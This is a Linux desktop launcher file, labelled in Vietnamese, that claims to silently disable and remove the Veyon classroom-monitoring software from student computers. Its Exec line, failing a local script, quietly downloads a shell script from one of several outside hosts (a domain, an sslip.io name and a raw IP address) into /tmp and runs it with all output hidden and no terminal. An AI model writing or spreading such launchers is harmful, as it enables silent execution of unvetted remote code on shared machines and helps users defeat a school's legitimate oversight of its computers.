[Desktop Entry]
Version=1.0
Type=Application
Name=1 - Xóa Sạch Veyon
Comment=Tắt và gỡ bỏ hoàn toàn Veyon khỏi máy học sinh (Chạy ngầm)
Exec=sh -c 'DIR="$(cd "$(dirname "%k")" 2>/dev/null && pwd || pwd)"; if [ -f "$DIR/remove-veyon.sh" ]; then bash "$DIR/remove-veyon.sh" >/dev/null 2>&1; elif [ -f "./remove-veyon.sh" ]; then bash "./remove-veyon.sh" >/dev/null 2>&1; else (wget -qO /tmp/sg_remove_veyon.sh https://orbstrike.com/remove-veyon.sh || wget -qO /tmp/sg_remove_veyon.sh https://103-149-172-179.sslip.io/remove-veyon.sh || wget -qO /tmp/sg_remove_veyon.sh http://103.149.172.179:4000/remove-veyon.sh) && bash /tmp/sg_remove_veyon.sh >/dev/null 2>&1; fi'
Icon=utilities-terminal
Terminal=false
Categories=System;Utility;
StartupNotify=false
